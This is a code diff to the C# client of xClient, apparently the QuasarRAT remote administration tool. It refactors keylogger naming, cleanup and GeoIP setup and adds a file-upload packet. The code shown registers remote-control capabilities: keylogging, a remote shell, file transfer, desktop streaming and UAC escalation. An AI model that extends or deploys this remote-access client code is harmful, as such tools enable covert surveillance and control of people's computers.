@@ -6,9 +6,10 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
-using xClient.Core.Keylogger;
+using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
+using xClient.Core.Utilities;
 
 namespace xClient
 {
@@ -36,17 +37,16 @@ namespace xClient
 
         private static void Cleanup()
         {
+            CommandHandler.IsStreamingDesktop = false;
             CommandHandler.CloseShell();
-            if (CommandHandler.LastDesktopScreenshot != null)
-                CommandHandler.LastDesktopScreenshot.Dispose();
-            if (Logger.Instance != null)
-                Logger.Instance.Dispose();
+            if (CommandHandler.StreamCodec != null)
+                CommandHandler.StreamCodec.Dispose();
+            if (Keylogger.Instance != null)
+                Keylogger.Instance.Dispose();
             if (_msgLoop != null)
                 _msgLoop.ExitThread();
             if (_appMutex != null)
                 _appMutex.Close();
-
-            CommandHandler.StreamCodec = null;
         }
 
         private static void InitializeClient()
@@ -68,7 +68,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetDrives),
                 typeof (Core.Packets.ServerPackets.GetDirectory),
                 typeof (Core.Packets.ServerPackets.DoDownloadFile),
-                typeof (Core.Packets.ServerPackets.DoMouseClick),
+                typeof (Core.Packets.ServerPackets.DoMouseEvent),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.DoVisitWebsite),
                 typeof (Core.Packets.ServerPackets.DoShowMessageBox),
@@ -83,6 +83,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.DoStartupItemRemove),
                 typeof (Core.Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Core.Packets.ServerPackets.GetKeyloggerLogs),
+                typeof (Core.Packets.ServerPackets.DoUploadFile),
                 typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Core.Packets.ClientPackets.SetStatus),
                 typeof (Core.Packets.ClientPackets.SetUserStatus),
@@ -115,7 +116,7 @@ namespace xClient
             SystemCore.MyPath = Application.ExecutablePath;
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             SystemCore.AccountType = SystemCore.GetAccountType();
-            SystemCore.InitializeGeoIp();
+            GeoLocationHelper.Initialize();
 
             if (Settings.ENABLEUACESCALATION)
             {
@@ -148,7 +149,7 @@ namespace xClient
                     new Thread(() =>
                     {
                         _msgLoop = new ApplicationContext();
-                        Logger logger = new Logger(15000);
+                        Keylogger logger = new Keylogger(15000);
                         Application.Run(_msgLoop);
                     }).Start(); ;
                 }
